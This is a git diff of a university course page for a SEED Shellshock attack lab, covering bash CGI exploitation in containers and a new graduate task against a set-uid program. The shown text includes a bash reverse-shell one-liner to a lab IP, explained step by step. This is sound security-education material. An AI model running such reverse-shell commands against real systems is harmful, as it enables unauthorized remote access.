@@ -2,18 +2,17 @@
 layout: default
 tags: [labs, seed]
 dirname: 'lab02'
+labprefix: 'Lab 02'
+labtitle: 'Shellshock Attack Lab'
 title: 'Lab 02: Shellshock Attack Lab'
 duedate: 'Tuesday [02/16/2021] @ 11:59 AM (MST)'
-published: False
+published: True
 ---
 
-_**TODO: Was `bash_shellshock` renamed to `bashbug` on the new VMs?**_
-{:.lead .text-center}
+# {{page.labprefix}}: {{page.labtitle}}
+{:.pb-4}
 
-_**TODO: Grad Student Credit?**_
-{:.lead .text-center}
-
-## {{page.title}}
+## {{page.labtitle}}
 {:.titletext}
 Adapted from SEED Labs: A Hands-on Lab for Security Education.
 {:.subtitletext}
@@ -22,13 +21,12 @@ On September 24, 2014, a severe vulnerability in bash was identified.
 Nicknamed _Shellshock_, this vulnerability can exploit many systems and be launched either remotely or from a local machine.
 In this lab, students will work on this attack to better understand the Shellshock vulnerability.
 The learning objective of this lab is for students to get first-hand experience with this interesting attack,
- understand how it works, and think about more general lessons that we can take aware from this attack.
-The first version of this lab was developed on September 29, 2014, just
-five days after the attack was reported. It was assigned to the students
-in our Computer Security class on September 30, 2014. An important
-mission of the SEED project is to quickly turn real attacks into
-educational materials, so instructors can bring them into their
-classrooms in a timely manner and keep their students engaged with what happens in the real world.
+understand how it works, and think about more general lessons that we can take aware from this attack.
+The first version of this lab was developed on September 29, 2014, just five days after the attack was reported.
+<!-- It was assigned to the students in our Computer Security class on September 30, 2014.  -->
+<!-- An important mission of the SEED project is to quickly turn real attacks into educational materials,  -->
+<!-- so instructors can bring them into their classrooms in a timely manner and keep their students engaged with what happens in the real world. -->
+
 This lab covers the following topics:
 
 -   Shellshock
@@ -39,19 +37,30 @@ This lab covers the following topics:
 ### Resources
 
 - Code related to this lab can be found in our [class's GitHub repository](https://github.com/traviswpeters/cs476-code). Specifically, see `02_shellshock/`.
+- The [shellshcoker.net website](https://www.minttm.com/takeover-shellshocker-net) _(includes links to relevant CVEs)_
+- A nice write-up: [Everything you need to know about the Shellshock Bash bug](https://www.troyhunt.com/everything-you-need-to-know-about2/)
+- [Where is Bash Shellshock vulnerability in source code? (StackExchange)](https://security.stackexchange.com/a/68450) has a nice summary of the vulnerable code details about early patches.
 - Chapter 3 in the [SEED Textbook]({{site.data.settings.textbookseedlink}}).
 - A related [video lecture](https://www.handsonsecurity.net/video.html) (Udemy course) recorded by Kevin Du.
 
+<!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
+<!-- <div class="card bg-secondary border-primary" markdown="1"> -->
+<!-- <div class="card-body" markdown="1"> -->
+<!-- <h2 class="card-title">Environment Setup</h2> -->
+<!-- {:.titletext} -->
+<!-- This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM). -->
+<!-- {:.subtitletext} -->
+
 ## Environment Setup
-{:.titletext}
-This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM).
-{:.subtitletext}
 
 This lab uses a new approach that is dependent on docker/containers.
 The transition to containers was meant to make the setup for this lab easier.
+(Old versions of network and web security labs required multiple VMs - containers are much more lightweight and easy to work with.)
 If, however, you encounter any issues, please let me know, and we can work to troubleshoot.
 Please follow the rest of this section very carefully:
 it contains critical information to ensure that this lab will work properly.
+
+For reference, here is a link to the official [SEED Manual for Containers](https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md).
 
 ### DNS Settings
 
@@ -139,7 +148,7 @@ program (called `vul.cgi`). It simply prints out "Hello World" using a
 shell script. The CGI program is put inside Apache's default CGI folder
 `/usr/lib/cgi-bin`, and it must be executable.
 
-<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fhello.cgi&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>
+<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fimage_www%2Fvul.cgi&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>
 
 The CGI program uses `/bin/bash_shellshock` (the first line), instead of
 using `/bin/bash`. This line specifies what shell program should be
@@ -156,6 +165,10 @@ sure that the web server container is running.
 $ curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
 ```
 
+<!-- </div> -->
+<!-- </div> -->
+<!-- END Special Section -->
+
 ## Lab Tasks
 {:.titletext}
 This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM).
@@ -164,7 +177,7 @@ This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM).
 Detailed guidelines on the Shellshock attack can be found in the SEED
 book, so we will not repeat the guidelines in the lab description.
 
-### Task 1: Experimenting with Bash Function
+### Task 1: Experimenting with Bash Functions
 
 The bash program in Ubuntu 20.04 has already been patched, so it is no
 longer vulnerable to the Shellshock attack. For the purpose of this lab,
@@ -179,19 +192,19 @@ Please design an experiment to verify whether this bash is vulnerable to
 the Shellshock attack or not. Conduct the same experiment on the patched
 version `/bin/bash` and report your observations.
 
-### Task 2: Passing Data to Bash via Environment Variable
+### Task 2: Passing Data to Bash via Environment Variables
 
 To exploit a Shellshock vulnerability in a bash-based CGI program,
-attackers need to pass their data to the vulnerable bash program, and
-the data need to be passed via an environment variable. In this task, we
-need to see how we can achieve this goal. We have provided another CGI
-program (`getenv.cgi`) on the server to help you identify what user data
-can get into the environment variables of a CGI program. This CGI
-program prints out all its environment variables.
+attackers need to pass their data to the vulnerable bash program,
+and the data needs to be passed via an environment variable.
+In this task, we need to see how we can achieve this goal.
+We have provided another CGI program (`getenv.cgi`) on the server to help you identify what user data is translated into environment variables,
+which are ultimately passed to a CGI program.
+This CGI program prints out all its environment variables for the current process.
 
-<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fenv.cgi&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>
+<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fimage_www%2Fgetenv.cgi&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>
 
-#### Task 2.1: Using a browser
+#### Task 2.1: Passing Data via A Browser
 
 In the code above, Line prints out the contents of all the environment
 variables in the current process. Normally, you would see something like
@@ -212,7 +225,7 @@ HTTP_ACCEPT_ENCODING=gzip, deflate
 ...
 ```
 
-#### Task 2.2: Using `curl`
+#### Task 2.2: Passing Data via `curl`
 
 If we want to set the environment variable data to arbitrary values, we
 will have to modify the behavior of the browser, that will be too
@@ -329,6 +342,7 @@ In this task, you need to demonstrate that you can get a reverse shell from the 
 
 To help you, we summarize some of the major ideas below.
 
+<!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
 <div class="card bg-secondary border-primary" markdown="1">
 <div class="card-body" markdown="1">
 <h4 class="card-title">Creating A Reverse Shell</h4>
@@ -383,7 +397,7 @@ It can be quite complicated to read terse commands such as these; we provide a d
 -   `2>&1`: File descriptor `2` represents standard error (`stderr`).
     This causes the error output to be redirected to `stdout`, which is the TCP connection.
 
-In summary, the command
+**In summary**, the command
 ```
 /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
 ```
@@ -393,6 +407,7 @@ This is confirmed via the `Connection from 10.0.2.5 ...` message displayed by `n
 
 </div>
 </div>
+<!-- END Special Section -->
 
 ### Task 5: Using the Patched Bash
 
@@ -402,5 +417,15 @@ The program `/bin/bash` is a patched version.
 Please replace the first line of the CGI programs with this program to have your CGI programs used the patched version of bash.
 
 Repeat Task 3 and describe your observations.
+
+### Task 6: Attacking Set-UID Programs via Shellshock (Graduate Credit)
+
+Leveraging what you learned in Lab 01 and Lab 02, design an experiment to exploit a root-owned set-uid program via a Shellshock attack.
+
+Please use the following code from our course repository as the target of your attack.
+
+<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fimage_www%2Fvul.c&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>
+
+Please explain your attack strategy and observed outcome. 
 
 {% include lab_submission.html %}
